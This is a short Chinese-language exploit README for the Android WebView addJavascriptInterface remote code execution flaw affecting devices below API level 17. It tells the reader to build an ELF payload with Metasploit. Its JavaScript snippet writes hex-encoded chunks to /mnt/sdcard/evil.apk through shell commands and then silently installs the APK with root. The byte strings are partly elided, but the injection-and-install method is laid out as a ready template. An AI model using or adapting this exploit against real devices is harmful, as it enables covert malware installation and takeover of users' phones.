详情文章: https://xz.aliyun.com/t/11505

# Android-webview-inject-shell
webview javascript addJavascriptInterface RCE test



### 影响版本

-  Android API level 小于17 (即Android 4.2之前的系统版本) 

### 漏洞执行处

-  WebView.addJavascriptInterface(Object obj, String interfaceName)  
-  使用addJavascriptInterface方法注册可供JavaScript调用的Java对象； 
-  使用WebView加载外部网页或者本地网页； 

## 注意事项

通过msf生成的elf后，并转为十六进制（注意x86\x64系统）

注入apk写法如下，目前测试只能注入低于100kb的代码量 （必须是\\\x格式）

亲测 js文件过大，会卡死 - -

```js
var armBinary1 = "\\x50\\x4b\\x03\\x04\\x14\\x42\\xbf--------\\x40\\x7f"
var armBinary2 = "\\x93\\x9a\\xff\\xa2\\x56--------\\x5f\\x0a\\x3d\\"
var armBinary3 = "\\xdb\\x06\\x00\\x00\\x0c\\x1c--------\\\\x00\\x00\\x13"
var armBinary4 = "\\x2e\\x78\\x6d\\x6c\\xad\\x97--------\\\\xcb\\x00\\x00\\x00"


execute(["/system/bin/sh","-c","echo -n '"+armBinary1+"' >  /mnt/sdcard/evil.apk"]);
execute(["/system/bin/sh","-c","echo -n '"+armBinary2+"' >>  /mnt/sdcard/evil.apk"]);
execute(["/system/bin/sh","-c","echo -n '"+armBinary3+"' >>  /mnt/sdcard/evil.apk"]);
execute(["/system/bin/sh","-c","echo -n '"+armBinary4+"' >>  /mnt/sdcard/evil.apk"]);
execute(["su","-c","pm install -r /mnt/sdcard/evil.apk"]);
```

## Reference

https://cloud.tencent.com/developer/article/1743487
https://wooyun.js.org/drops/WebView%E4%B8%AD%E6%8E%A5%E5%8F%A3%E9%9A%90%E6%82%A3%E4%B8%8E%E6%89%8B%E6%9C%BA%E6%8C%82%E9%A9%AC%E5%88%A9%E7%94%A8.html
